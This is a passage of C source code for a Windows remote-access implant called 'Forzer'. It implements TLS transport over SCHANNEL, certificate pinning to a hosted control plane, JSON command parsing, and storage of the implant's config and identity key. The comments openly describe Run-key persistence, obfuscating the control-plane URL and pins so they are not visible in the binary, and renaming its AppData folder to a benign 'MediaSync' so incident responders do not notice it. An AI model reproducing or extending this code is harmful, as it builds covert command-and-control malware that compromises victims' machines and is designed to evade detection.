        g_tls_sock = INVALID_SOCKET;
        g_use_tls = 0;
        g_sock = INVALID_SOCKET;
        if (g_tls_in) { free(g_tls_in); g_tls_in = NULL; g_tls_in_len = g_tls_in_cap = 0; }
        if (g_tls_out) { free(g_tls_out); g_tls_out = NULL; g_tls_out_len = g_tls_out_off = 0; }
    } else {
        if (g_sock != INVALID_SOCKET) closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
    WSACleanup();
}

/* ------------------------------------------------------------------ */
/* wss (TLS) transport via SCHANNEL                                   */
/* ------------------------------------------------------------------ */

static int tls_send(const char *data, int len) {
    int max = g_ssizes.cbMaximumMessage;
    int off = 0;
    while (off < len) {
        int chunk = len - off;
        if (chunk > max) chunk = max;
        int msglen = g_ssizes.cbHeader + chunk + g_ssizes.cbTrailer;
        BYTE *msg = malloc(msglen);
        if (!msg) return 0;
        memcpy(msg + g_ssizes.cbHeader, data + off, chunk);
        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER; bufs[0].pvBuffer = msg; bufs[0].cbBuffer = g_ssizes.cbHeader;
        bufs[1].BufferType = SECBUFFER_DATA; bufs[1].pvBuffer = msg + g_ssizes.cbHeader; bufs[1].cbBuffer = chunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER; bufs[2].pvBuffer = msg + g_ssizes.cbHeader + chunk; bufs[2].cbBuffer = g_ssizes.cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
        if (EncryptMessage(&g_ctx, 0, &bd, 0) != SEC_E_OK) { free(msg); return 0; }
        int total = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        if (!sock_send_all(g_tls_sock, (char *)msg, total)) { free(msg); return 0; }
        free(msg);
        off += chunk;
    }
    return 1;
}

static int tls_recv(char *out, int cap) {
    if (g_tls_out_len - g_tls_out_off > 0) {
        int n = g_tls_out_len - g_tls_out_off;
        if (n > cap) n = cap;
        memcpy(out, g_tls_out + g_tls_out_off, n);
        g_tls_out_off += n;
        if (g_tls_out_off >= g_tls_out_len) {
            free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
        }
        return n;
    }
    for (;;) {
        BYTE tmp[16384];
        int r = recv(g_tls_sock, (char *)tmp, sizeof(tmp), 0);
        if (r <= 0) return -1;
        if (g_tls_in_len + r > g_tls_in_cap) {
            int cap = (g_tls_in_len + r) * 2;
            BYTE *p = (BYTE *)realloc(g_tls_in, cap);
            if (!p) return -1;
            g_tls_in = p;
            g_tls_in_cap = cap;
        }
        memcpy(g_tls_in + g_tls_in_len, tmp, r);
        g_tls_in_len += r;

        SecBuffer bufs[4];
        bufs[0].BufferType = SECBUFFER_DATA; bufs[0].pvBuffer = g_tls_in; bufs[0].cbBuffer = g_tls_in_len;
        bufs[1].BufferType = SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL; bufs[1].cbBuffer = 0;
        bufs[2].BufferType = SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL; bufs[2].cbBuffer = 0;
        bufs[3].BufferType = SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL; bufs[3].cbBuffer = 0;
        SecBufferDesc bd = { SECBUFFER_VERSION, 4, bufs };
        SECURITY_STATUS st = DecryptMessage(&g_ctx, &bd, 0, NULL);
        if (st == SEC_E_OK) {
            BYTE *plain = (BYTE *)bufs[1].pvBuffer;
            int plainLen = bufs[1].cbBuffer;
            BYTE *extra = (BYTE *)bufs[3].pvBuffer;
            int extraLen = bufs[3].cbBuffer;
            int consumed = (extraLen > 0) ? (int)(extra - g_tls_in) : g_tls_in_len;
            int leftover = g_tls_in_len - consumed;
            if (leftover > 0) memmove(g_tls_in, g_tls_in + consumed, leftover);
            g_tls_in_len = leftover;
            g_tls_out = malloc(plainLen > 0 ? plainLen : 1);
            memcpy(g_tls_out, plain, plainLen);
            g_tls_out_len = plainLen; g_tls_out_off = 0;
            int n = plainLen; if (n > cap) n = cap;
            memcpy(out, g_tls_out, n);
            g_tls_out_off = n;
            if (g_tls_out_off >= g_tls_out_len) {
                free(g_tls_out); g_tls_out = NULL; g_tls_out_len = 0; g_tls_out_off = 0;
            }
            return n;
        } else if (st == SEC_E_INCOMPLETE_MESSAGE) {
            continue;
        } else {
            return -1;
        }
    }
}

/* Release everything a failed handshake allocated and report failure.
   tls_handshake() has six distinct ways to give up and they all need the same
   six lines; a seventh was about to be added, so they are one function now. */
static int tls_fail(const char *what, DWORD err) {
    DBG("error: %s (0x%lx)\n", what, err);
    if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
    g_tls_sock = INVALID_SOCKET;
    g_sock = INVALID_SOCKET;
    DeleteSecurityContext(&g_ctx);
    FreeCredentialsHandle(&g_cred);
    return 1;
}

#include "urlkey.h"

/* Pinned control-plane public keys: the SHA-256 of the server certificate's
   DER SubjectPublicKeyInfo, keystream-obfuscated like the url. Generated by
   urlenc.exe, which takes the hash on the command line.

   Why this exists: the agent could not validate a real HTTPS server's chain at
   all. CertGetCertificateChain() builds from the trusted store plus whatever the
   caller supplies, and by default ignores the intermediates that arrived in the
   TLS handshake — and a real server's leaf is issued by an *intermediate*, not
   a root, so the chain came back as one element and every wss:// connection
   died with CERT_E_UNTRUSTEDROOT. Reproduced outside the agent: a chain build
   with the system store and an empty extra store returns PartialChain with
   elements=1, while the same URL fetched by the OS's own HTTPS client returns
   200. So the certificate was always fine and the validation was always wrong.
   It never showed up because every test target was ws:// on loopback.

   A pin is the right shape of fix for an implant that talks to exactly one
   endpoint: the trust anchor becomes "this control plane's key" instead of
   "anything a public CA has issued", which is strictly stronger — a CA
   mis-issuance cannot impersonate it, and the implant does not depend on the
   host's root store at all.

   Several entries are accepted if present, so a key rotation does not brick an
   install while the replacement rolls out. A build with none behaves exactly as
   it did before: chain validation only, and it will fail on an unbuildable
   chain. Regenerate with:
       urlenc.exe wss://host <sha256-of-spki> [<sha256-of-spki> ...]

   Note this is a build-time pin. A long-lived install will need either a new
   build or a remotely updatable pin table when the server's key rotates; the
   update op already carries a digest over the authenticated channel and is the
   natural place to extend. Until that exists, rotation means a rebuild. */
static const unsigned char k_builtin_pin_blob[][32] = {
  { 0xCF, 0x6E, 0xA5, 0xA0, 0xE4, 0x1C, 0x26, 0x25, 0xBA, 0xCC, 0x6C, 0x7A, 0x7E, 0xBE, 0xFE, 0x0A,
    0x92, 0x74, 0x45, 0x0F, 0xFD, 0xE0, 0x08, 0xCA, 0x5F, 0x13, 0x53, 0x29, 0x8A, 0x5A, 0x4D, 0x6B },
};
static const unsigned int k_builtin_pin_count = 1;

/* SHA-256 over a memory buffer, raw 32-byte digest.

   Raw bytes, not hex: the pin table holds obfuscated *bytes*, so comparing a
   hex string against them silently never matches. The hex form is only ever
   produced for display, by hex_of(). */
static int sha256_bytes(const unsigned char *data, size_t len, unsigned char out[32]) {
    HCRYPTPROV prov = 0;
    HCRYPTHASH hh = 0;
    if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
        !CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hh)) {
        if (prov) CryptReleaseContext(prov, 0);
        return 0;
    }
    int ok = CryptHashData(hh, data, (DWORD)len, 0);
    DWORD dlen = 32;
    if (ok && !CryptGetHashParam(hh, HP_HASHVAL, out, &dlen, 0)) ok = 0;
    CryptDestroyHash(hh);
    CryptReleaseContext(prov, 0);
    return ok && dlen == 32;
}

static void hex_of(const unsigned char *b, size_t n, char *out) {
    static const char hx[] = "0123456789abcdef";
    for (size_t i = 0; i < n; i++) {
        out[i * 2]     = hx[(b[i] >> 4) & 15];
        out[i * 2 + 1] = hx[(b[i] & 15)];
    }
    out[n * 2] = 0;
}

/* Does this leaf's public key match one this build was pinned to?

   The hash is taken over the certificate's own public-key bit string, so nothing
   has to be decoded or re-encoded. Hashing the key rather than the whole
   certificate means a renewal that reuses the key needs no new pin, and this
   SDK's <wincrypt.h> does not expose the SPKI DER member at all. */
static int spki_matches_pin(PCCERT_CONTEXT pCert) {
    if (k_builtin_pin_count == 0) return 0;
    const CRYPT_BIT_BLOB *key = &pCert->pCertInfo->SubjectPublicKeyInfo.PublicKey;
    if (!key->pbData || key->cbData == 0) return 0;

    unsigned char dig[32];
    if (!sha256_bytes(key->pbData, key->cbData, dig)) return 0;

    for (unsigned int i = 0; i < k_builtin_pin_count; i++) {
        /* Read the blob through a volatile pointer for the same reason the url
           blob is: without it, -O2 folds the XOR away and the pin ends up in
           .rdata as plaintext. */
        const volatile unsigned char *b = k_builtin_pin_blob[i];
        unsigned diff = 0;
        for (int j = 0; j < 32; j++)
            diff |= (unsigned)((b[j] ^ url_ks((unsigned)j)) ^ dig[j]);
        /* Not constant-time, deliberately: this is a public key and the input is
           whatever the network just handed us. There is nothing to leak. */
        if (diff == 0) return 1;
    }
    char hex[65];
    hex_of(dig, 32, hex);
    DBG("public key does not match any pin (%s)\n", hex);
    return 0;
}

/* Case-insensitive host match, with a wildcard allowed only as the whole
   leftmost label. */
static int dns_name_matches(const wchar_t *pattern, const char *host) {
    if (!pattern || !*pattern || !host || !*host) return 0;

    wchar_t wpat[512] = {0}, whost[512] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 512) <= 0) return 0;
    size_t n = wcslen(pattern);
    if (n == 0 || n >= 512) return 0;
    for (size_t i = 0; i < n; i++) wpat[i] = towlower(pattern[i]);
    for (size_t i = 0; whost[i]; i++) whost[i] = towlower(whost[i]);

    if (wpat[0] == L'*' && wpat[1] == L'.') {
        /* A wildcard covers exactly one label. So the host must be
           "<something>.<tail>": the first dot in the host separates the label
           the wildcard stands in for from the rest, and the rest must equal the
           pattern's tail exactly. Comparing against `dot` rather than past it
           is an off-by-one that makes "*.onrender.com" miss
           "forzerc2.onrender.com" — which is exactly what it did. */
        const wchar_t *tail = wpat + 2;
        const wchar_t *dot = wcschr(whost, L'.');
        if (!dot) return 0;
        const wchar_t *rest = dot + 1;
        size_t tlen = wcslen(tail);
        if (tlen != wcslen(rest)) return 0;
        for (size_t i = 0; i < tlen; i++) if (tail[i] != rest[i]) return 0;
        /* "*.com" must match nothing: the remainder needs a dot of its own. */
        return wcschr(tail, L'.') != NULL;
    }
    return wcscmp(wpat, whost) == 0;
}

/* Every dNSName in the subjectAltName, checked one at a time.

   This has to walk the extension rather than ask CertGetNameStringW, because
   that returns only the FIRST DNS name it finds. A certificate for this
   control plane is `DNS:onrender.com, DNS:*.onrender.com` — the first entry is
   the bare domain, so a single-name comparison fails against
   forzerc2.onrender.com while the wildcard two entries later is the name that
   actually covers it. That is not a hypothetical: it is what the live endpoint
   presents. */
static int san_covers_host(PCCERT_CONTEXT pCert, const char *host, int *san_present) {
    *san_present = 0;

    PCERT_EXTENSION pe = CertFindExtension("2.5.29.17", pCert->pCertInfo->cExtension,
                                           pCert->pCertInfo->rgExtension);
    if (!pe) return 0;   /* no SAN at all: the caller falls back to the CN */
    *san_present = 1;

    DWORD cb = 0;
    if (!CryptDecodeObjectEx(X509_ASN_ENCODING, "2.5.29.17", pe->Value.pbData,
                             pe->Value.cbData, 0, NULL, NULL, &cb) || cb == 0)
        return 0;
    CERT_ALT_NAME_INFO *pAlt = (CERT_ALT_NAME_INFO *)malloc(cb);
    if (!pAlt) return 0;

    int matched = 0;
    if (CryptDecodeObjectEx(X509_ASN_ENCODING, "2.5.29.17", pe->Value.pbData,
                            pe->Value.cbData, 0, NULL, pAlt, &cb)) {
        for (DWORD i = 0; i < pAlt->cAltEntry && !matched; i++) {
            if (pAlt->rgAltEntry[i].dwAltNameChoice != CERT_ALT_NAME_DNS_NAME) continue;
            matched = dns_name_matches(pAlt->rgAltEntry[i].pwszDNSName, host);
        }
    }
    free(pAlt);
    return matched;
}

/* Does this leaf's name cover this host?

   RFC 6125 order, deliberately: a subjectAltName decides it when there is one,
   and the subject CN is consulted only when there is not. The CN fallback is
   the whole family of name-confusion bugs, and a certificate that lists names
   we do not match must fail rather than quietly get a second chance. */
static int host_matches_cert(PCCERT_CONTEXT pCert, const char *host) {
    int san_present = 0;
    if (san_covers_host(pCert, host, &san_present)) return 1;
    if (san_present) return 0;   /* a SAN exists and does not cover this host */

    wchar_t cn[512] = {0};
    if (CertGetNameStringW(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, CERT_X500_NAME_STR,
                           NULL, cn, 512) == 0)
        return 0;
    return dns_name_matches(cn, host);
}

/* The original validation: build a chain to a trusted root and run the SSL
   policy, which is what matches the hostname. Returns 1 on success. Kept whole
   and unchanged in behaviour, because it is still the right check for an
   endpoint whose chain does build — including every ws:// development target,
   and any wss:// endpoint whose issuer is a root rather than an intermediate. */
static int verify_chain_and_name(PCCERT_CONTEXT pCert, const char *host) {
    wchar_t whost[256] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256) <= 0) return 0;

    /* pTrustedStore is left NULL so the system root store is used; passing the
       leaf there instead would make it its own trusted root and accept
       anything. */
    CERT_CHAIN_PARA chainPara;
    memset(&chainPara, 0, sizeof(chainPara));
    chainPara.cbSize = sizeof(chainPara);

    PCCERT_CHAIN_CONTEXT pChain = NULL;
    if (!CertGetCertificateChain(NULL, pCert, NULL, NULL, &chainPara,
                                 CERT_CHAIN_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT,
                                 NULL, &pChain) || !pChain) {
        DBG("could not build chain (0x%lx)\n", GetLastError());
        return 0;
    }

    /* Hostname and revocation ride along as the SSL policy's extra parameters —
       they are fields of SSL_EXTRA_CERT_CHAIN_POLICY_PARA, not flags. */
    SSL_EXTRA_CERT_CHAIN_POLICY_PARA sslExtra;
    memset(&sslExtra, 0, sizeof(sslExtra));
    sslExtra.dwAuthType = AUTHTYPE_SERVER;
    sslExtra.pwszServerName = whost;

    CERT_CHAIN_POLICY_PARA polPara;
    memset(&polPara, 0, sizeof(polPara));
    polPara.cbSize = sizeof(polPara);
    /* "Revocation status unknown" is a reason to accept a chain, not a reason
       to declare it valid: zeroing dwError outright would mask every other
       error the policy reported. This scopes the leniency to revocation. */
    polPara.dwFlags = CERT_CHAIN_POLICY_IGNORE_ALL_REV_UNKNOWN_FLAGS;
    polPara.pvExtraPolicyPara = &sslExtra;

    CERT_CHAIN_POLICY_STATUS st;
    memset(&st, 0, sizeof(st));
    st.cbSize = sizeof(st);

    BOOL ok = CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, pChain, &polPara, &st);
    int good = (ok && st.dwError == 0);
    if (!good) DBG("chain rejected (0x%lx)\n", ok ? st.dwError : 0L);

    CertFreeCertificateChain(pChain);
    return good;
}

static int tls_handshake(const char *host, int port) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    char ps[16];
    snprintf(ps, sizeof(ps), "%d", port);
    if (getaddrinfo(host, ps, &hints, &res) != 0) return 1;
    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return 1; }
    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        DBG("error: tls connect failed (%d)\n", WSAGetLastError());
        closesocket(s); freeaddrinfo(res); return 1;
    }
    {
        DWORD to = 10000;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    }
    freeaddrinfo(res);
    g_tls_sock = s;
    g_sock = s;

    SCHANNEL_CRED sc;
    memset(&sc, 0, sizeof(sc));
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
    TimeStamp ts;
    if (AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, NULL,
                                  &sc, NULL, NULL, &g_cred, &ts) != SEC_E_OK) {
        closesocket(s); g_tls_sock = INVALID_SOCKET; g_sock = INVALID_SOCKET;
        return tls_fail("tls credential init failed", GetLastError());
    }

    SecBuffer inbuf[2];
    SecBuffer outbuf[2];
    SecBufferDesc inbd, outbd;
    DWORD outFlags;
    BYTE *extra = NULL;
    DWORD extraLen = 0;
    BOOL haveCtx = FALSE;
    BOOL needSend = TRUE;
    SECURITY_STATUS rc;

    for (;;) {
        outbuf[0].BufferType = SECBUFFER_TOKEN;
        outbuf[0].pvBuffer = NULL;
        outbuf[0].cbBuffer = 0;
        outbuf[1].BufferType = SECBUFFER_ALERT;
        outbuf[1].pvBuffer = NULL;
        outbuf[1].cbBuffer = 0;
        outbd.ulVersion = SECBUFFER_VERSION;
        outbd.cBuffers = 2;
        outbd.pBuffers = outbuf;

        if (needSend) {
            if (haveCtx && extraLen > 0) {
                inbuf[0].BufferType = SECBUFFER_TOKEN;
                inbuf[0].pvBuffer = extra;
                inbuf[0].cbBuffer = extraLen;
                inbuf[1].BufferType = SECBUFFER_EMPTY;
                inbuf[1].pvBuffer = NULL;
                inbuf[1].cbBuffer = 0;
                inbd.ulVersion = SECBUFFER_VERSION;
                inbd.cBuffers = 2;
                inbd.pBuffers = inbuf;
            } else {
                inbd.ulVersion = SECBUFFER_VERSION;
                inbd.cBuffers = 0;
                inbd.pBuffers = NULL;
            }
            rc = InitializeSecurityContextA(&g_cred, haveCtx ? &g_ctx : NULL,
                (SEC_CHAR *)host,
                ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY |
                ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM,
                0, 0, haveCtx ? &inbd : NULL, 0, &g_ctx, &outbd, &outFlags, &ts);
            if (outbuf[0].cbBuffer && outbuf[0].pvBuffer) {
                sock_send_all(g_tls_sock, (char *)outbuf[0].pvBuffer, outbuf[0].cbBuffer);
                FreeContextBuffer(outbuf[0].pvBuffer);
                outbuf[0].pvBuffer = NULL; outbuf[0].cbBuffer = 0;
            }
            if (rc == SEC_E_OK || rc == SEC_I_CONTINUE_NEEDED) {
                if (haveCtx && extraLen > 0) {
                    int foundExtra = 0;
                    for (int i = 0; i < 2; i++) {
                        if (outbuf[i].BufferType == SECBUFFER_EXTRA) {
                            foundExtra = 1;
                            ULONG left = outbuf[i].cbBuffer;
                            if (left == 0) {
                                free(extra); extra = NULL; extraLen = 0;
                            } else if (left < extraLen) {
                                memmove(extra, extra + extraLen - left, left);
                                extraLen = left;
                            }
                            break;
                        }
                    }
                    if (!foundExtra) {
                        free(extra); extra = NULL; extraLen = 0;
                    }
                }
                if (rc == SEC_E_OK) { haveCtx = TRUE; break; }
                haveCtx = TRUE;
                needSend = FALSE;
                continue;
            }
            if (extra) free(extra);
            return tls_fail("tls handshake failed", (DWORD)rc);
        } else {
            for (;;) {
                BYTE rh[5];
                int got = 0;
                while (got < 5) {
                    int r = recv(g_tls_sock, (char *)rh + got, 5 - got, 0);
                    if (r <= 0) { if (extra) free(extra); return tls_fail("tls record header read failed", WSAGetLastError()); }
                    got += r;
                }
                int reclen = (rh[3] << 8) | rh[4];
                if (reclen > 65536) { if (extra) free(extra); return tls_fail("tls record oversized", reclen); }
                BYTE *body = (BYTE *)malloc(reclen);
                got = 0;
                while (got < reclen) {
                    int r = recv(g_tls_sock, (char *)body + got, reclen - got, 0);
                    if (r <= 0) { free(body); if (extra) free(extra); return tls_fail("tls record body read failed", WSAGetLastError()); }
                    got += r;
                }
                extra = (BYTE *)realloc(extra, extraLen + 5 + reclen);
                memcpy(extra + extraLen, rh, 5);
                memcpy(extra + extraLen + 5, body, reclen);
                extraLen += 5 + reclen;
                free(body);
                break;
            }
            needSend = TRUE;
        }
    }
    if (extra && extraLen > 0) {
        g_tls_in = malloc(extraLen);
        memcpy(g_tls_in, extra, extraLen);
        g_tls_in_len = extraLen;
        g_tls_in_cap = extraLen;
    }
    if (extra) free(extra);

    if (QueryContextAttributesA(&g_ctx, SECPKG_ATTR_STREAM_SIZES, &g_ssizes) != SEC_E_OK)
        return 1;

    /* Trust the server two independent ways, and require the name to match
       either way.

       The chain path is the original CertGetCertificateChain() +
       CERT_CHAIN_POLICY_SSL check, kept intact. It is correct when the chain
       *can* be built, and it is what a build with no pinned key relies on
       entirely. It cannot be built for a real CDN-fronted endpoint, because
       the issuer is an intermediate that arrives in the handshake and
       CertGetCertificateChain() does not look there by default — see the note
       on k_builtin_pin_blob.

       So the pin is a second, independent path to the same decision: if the
       leaf's public key is one this build knows, the control plane is the one
       it was built for, and the chain it came with is not the thing being
       trusted. Accepting on either is strictly more available than before and
       never weaker, because a pin match is a commitment to a specific key that
       a CA compromise does not produce and a man-in-the-middle cannot forge.

       The hostname is checked in both cases and is not optional. The chain
       path gets it from the SSL policy; the pin path has no chain to ask, so
       it does the name comparison itself. */
    {
        PCCERT_CONTEXT pCert = NULL;
        if (QueryContextAttributesA(&g_ctx, SECPKG_ATTR_REMOTE_CERT_CONTEXT, &pCert) != SEC_E_OK || !pCert)
            return tls_fail("server certificate unavailable", GetLastError());

        /* The name, first, and always. Cheapest thing to get wrong in the worst
           direction, so it is decided before anything else can forgive it. */
        if (!host_matches_cert(pCert, host)) {
            CertFreeCertificateContext(pCert);
            return tls_fail("server certificate does not cover this hostname", 0);
        }

        if (spki_matches_pin(pCert)) {
            DBG("server certificate pinned (public key matches a known control plane)\n");
        } else if (!verify_chain_and_name(pCert, host)) {
            /* Neither a pin this build knows nor a chain it can build. Say which
               situation that is: with pins compiled in it means the endpoint
               changed key, and the operator needs a new build. */
            int rc = k_builtin_pin_count
                ? tls_fail("server certificate is neither pinned nor trusted", 0)
                : tls_fail("server certificate not trusted", 0);
            CertFreeCertificateContext(pCert);
            return rc;
        }
        CertFreeCertificateContext(pCert);
    }

    g_use_tls = 1;

    /* Clear the 10s recv timeout we set for the handshake; otherwise an idle
       link (no traffic for 10s) makes recv() return 0 and the client tears
       down the connection. The server's WebSocket ping keeps us alive. */
    {
        DWORD to = 0;
        setsockopt(g_tls_sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
    }
    return 0;
}

static int tr_send(const char *data, int len) {
    return ws_send_frame(g_sock, 0x1, data, len) ? len : -1;
}

static int tr_recv(char *out, int cap, int *is_bin) {
    *is_bin = 0;
    int n = ws_recv(g_sock, out, cap);
    /* A binary message is a distinct kind of payload, not a control message
       that happened to be long, so the caller has to be told which it got. */
    if (n > 0 && g_bin) *is_bin = 1;
    return n;
}

static const char *json_str(const char *s, const char *key, char *out, int outsz) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return NULL;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (!*p) return NULL;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return NULL;
    p++;
    int i = 0;
    while (*p && *p != '"' && i < outsz - 1) {
        if (*p == '\\' && p[1]) {
            p++;
            char c = *p;
            if (c == 'n') out[i++] = '\n';
            else if (c == 't') out[i++] = '\t';
            else if (c == 'r') out[i++] = '\r';
            else if (c == '\\') out[i++] = '\\';
            else if (c == '"') out[i++] = '"';
            else { out[i++] = '\\'; if (i < outsz - 1) out[i++] = c; }
            p++;
        } else {
            out[i++] = *p++;
        }
    }
    out[i] = 0;
    return out;
}

/* Fetch a JSON *number* (e.g. "rc":0). json_str() only understands quoted
   strings and returns NULL for a bare number, which is why results used to
   always print an empty rc. */
static int json_num(const char *s, const char *key, long *out) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(s, pat);
    if (!p) return 0;
    p += strlen(pat);
    while (*p && *p != ':') p++;
    if (!*p) return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    char *endp = NULL;
    long v = strtol(p, &endp, 10);
    if (endp == p) return 0;
    *out = v;
    return 1;
}

static void json_escape(const char *in, char *out, int cap) {
    int i = 0;
    for (; *in && i < cap - 2; in++) {
        if (*in == '"' || *in == '\\') { out[i++] = '\\'; out[i++] = *in; }
        else if (*in == '\n') { out[i++] = '\\'; out[i++] = 'n'; }
        else if (*in == '\r') { out[i++] = '\\'; out[i++] = 'r'; }
        else if (*in == '\t') { out[i++] = '\\'; out[i++] = 't'; }
        else out[i++] = *in;
    }
    out[i] = 0;
}

/* ------------------------------------------------------------------ */
/* Configuration file                                                 */
/*                                                                    */
/* Everything used to come from environment variables alone. A Run key */
/* launch inherits no environment, so persistence could not work until */
/* the agent could read its own settings. Precedence is env > config   */
/* file > built-in default, so an operator can still override one      */
/* launch by hand.                                                     */
/*                                                                    */
/* The file is a flat JSON object, parsed with the same json_str()    */
/* already used for the wire protocol.                                 */
/* ------------------------------------------------------------------ */

#define CFG_VALUE_MAX 1024

typedef struct {
    char url[CFG_VALUE_MAX];
    char name[CFG_VALUE_MAX];
} config_t;

/* %APPDATA%\<sub>, falling back to the directory holding the binary
   (there is no user profile under SYSTEM).

   The subdirectory used to be "Forzer". That put a directory named after the
   tool in every user's AppData, which is the same mistake as naming the Run
   key after it: a responder browsing AppData sees it immediately. It now
   matches the install directory, and CONFIG_OLD is migrated out of on first
   run so an existing install keeps its identity rather than silently
   re-enrolling as a new implant. */
#define CONFIG_SUB  "MediaSync"
#define CONFIG_OLD  "Forzer"

static int config_dir_raw(const char *sub, char *out, int cap) {
    char base[MAX_PATH];
    DWORD n = GetEnvironmentVariableA("APPDATA", base, (DWORD)sizeof(base));
    if (n == 0 || n >= sizeof(base)) {
        DWORD m = GetModuleFileNameA(NULL, base, (DWORD)sizeof(base));
        if (m == 0 || m >= sizeof(base)) return 0;
        char *slash = strrchr(base, '\\');
        if (!slash) return 0;
        *slash = 0;
    }
    int need = snprintf(out, cap, "%s\\%s", base, sub);
    return need > 0 && need < cap;
}

/* Move config.json and identity.key out of the old directory. Best effort and
   idempotent: a failure here is not fatal, because the caller then simply
   uses the new directory, and the worst case is a re-enrolment under a new
   id rather than a crash or a wrong key. */
static void config_migrate_old(void) {
    char olddir[MAX_PATH], newdir[MAX_PATH], src[MAX_PATH], dst[MAX_PATH];
    if (!config_dir_raw(CONFIG_OLD, olddir, sizeof(olddir))) return;
    if (!config_dir_raw(CONFIG_SUB, newdir, sizeof(newdir))) return;
    if (strcmp(olddir, newdir) == 0) return;

    static const char *files[] = { "config.json", "identity.key" };
    CreateDirectoryA(newdir, NULL);
    for (size_t i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
        int a = snprintf(src, sizeof(src), "%s\\%s", olddir, files[i]);
        int b = snprintf(dst, sizeof(dst), "%s\\%s", newdir, files[i]);
        if (a <= 0 || a >= (int)sizeof(src) || b <= 0 || b >= (int)sizeof(dst)) continue;
        /* Never clobber: if the new directory already has the file, the
           install is already current and the old copy is just debris. */
        FILE *probe = fopen(dst, "rb");
        if (probe) { fclose(probe); continue; }
        MoveFileExA(src, dst, MOVEFILE_REPLACE_EXISTING);
    }
    RemoveDirectoryA(olddir);   /* succeeds only if we emptied it */
}

static int config_dir(char *out, int cap) {
    config_migrate_old();
    return config_dir_raw(CONFIG_SUB, out, cap);
}

static int config_path(char *out, int cap) {
    char dir[MAX_PATH];
    if (!config_dir(dir, sizeof(dir))) return 0;
    int need = snprintf(out, cap, "%s\\config.json", dir);
    return need > 0 && need < cap;
}

static int config_exists(char *path, int cap) {
    if (!config_path(path, cap)) return 0;
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    fclose(f);
    return 1;
}

/* ------------------------------------------------------------------ */
/* Implant identity                                                     */
/*                                                                    */
/* A P-256 keypair generated once and kept for the life of the install. */
/* The public half is what the control plane pins, so a rebooted box is */
/* recognisable; the private half proves possession on every reconnect, */
/* which is what makes the setup key a join secret rather than a        */
/* permanent credential.                                               */
/*                                                                    */
/* The private blob is stored DPAPI-encrypted (CryptProtectData, no    */
/* flags = current user), so a stolen identity.key is useless without  */
/* the user profile too. It sits beside config.json, which %APPDATA%    */
/* already scopes to this user.                                        */
/*                                                                    */
/* Layout: "FRZID2\0\0" | u32 enc_len | enc, where enc is the DPAPI-wrapped
 * shared secret and nothing else.
 *
 * This used to also carry the 65-byte own public point and a 65-byte pinned
 * control-plane point, because with ECDH the agent had to re-derive its public
 * half from a stored private blob and wanted to catch a corrupt one early. A
 * pre-shared secret has nothing to re-derive, and the control-plane pin is
 * implied: the server's proof is HMAC under the same secret, so an endpoint
 * that cannot produce it is not the one this implant enrolled with. That is a
 * stronger pin than storing a public point was — there is no trust-on-first-use
 * window, and no second write to the file after the first check-in.
 *
 * An FRZID1 file is rejected outright rather than reinterpreted: it holds a CNG
 * private blob that this build cannot import (see ngcrypt.h), so the honest
 * response is to re-enrol, not to guess.
 */
#define ID_MAGIC     "FRZID2\0\0"
#define ID_MAGIC_LEN 8
/* Budget for the DPAPI ciphertext, which is NOT the size of the secret it
   protects: DPAPI-NG prepends a few hundred bytes of blob header, master-key
   wrap and description. A 32-byte secret protects to ~300 bytes here, so
   sizing this against NG_SECRET_BYTES would under-allocate badly. */
#define ID_PROT_MAX 1024
#define ID_MAX (ID_MAGIC_LEN + 4 + ID_PROT_MAX)

static int identity_path(char *out, int cap) {
    char dir[MAX_PATH];
    if (!config_dir(dir, sizeof(dir))) return 0;
    int need = snprintf(out, cap, "%s\\identity.key", dir);
    return need > 0 && need < cap;
}

/* Bytes n, or 0 on any short read. */
static long read_all(const char *path, BYTE *buf, long cap) {
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    long n = (long)fread(buf, 1, (size_t)cap, f);
    fclose(f);
    return n;
}

static int write_atomic(const char *path, const BYTE *data, DWORD n) {
    char tmp[MAX_PATH + 8];
